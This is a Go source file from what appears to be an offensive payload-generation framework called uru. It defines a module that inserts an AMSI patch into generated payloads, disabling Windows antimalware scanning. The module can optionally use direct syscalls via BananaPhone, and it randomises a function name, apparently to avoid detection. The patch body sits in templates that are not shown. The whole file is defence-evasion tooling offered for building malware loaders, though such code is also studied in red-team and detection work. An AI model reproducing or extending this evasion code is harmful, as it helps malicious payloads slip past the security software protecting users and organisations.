package evasion

import (
	"embed"
	"strings"

	"github.com/guervild/uru/pkg/common"
	"github.com/guervild/uru/pkg/models"
)

type PatchAmsiEvasion struct {
	Name         string
	Description  string
	Debug        bool
	UseBanana 	 string
	SubName 	 string
}

func NewPatchAmsiEvasion() models.ObjectModel {

	return &PatchAmsiEvasion{
		Name:         "patchamsi",
		Description:  `Path amsi. Can use BananaPhone if set. (credits: method taken from Merlin, @Ne0nd0g)
  Argument(s):
    UseBanana: use BananaPhone to perfom syscall`,
		UseBanana: "false",
		SubName: common.RandomStringOnlyChar(5),
	}
}

func (e *PatchAmsiEvasion) GetImports() []string {

	imports := []string{
		`"fmt"`,
		`"syscall"`,
		`"unsafe"`,
		`"golang.org/x/sys/windows"`,
	}

	if strings.ToLower(e.UseBanana) == "true" {
		imports = append(imports, `bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"`)
	}

	return imports
}

func (e *PatchAmsiEvasion) RenderInstanciationCode(data embed.FS) (string, error) {
	return common.CommonRendering(data, "templates/evasions/patchamsi/instanciation.go.tmpl", e)
}

func (e *PatchAmsiEvasion) RenderFunctionCode(data embed.FS) (string, error) {
	return common.CommonRendering(data, "templates/evasions/patch/patch_functions.go.tmpl", e)
}
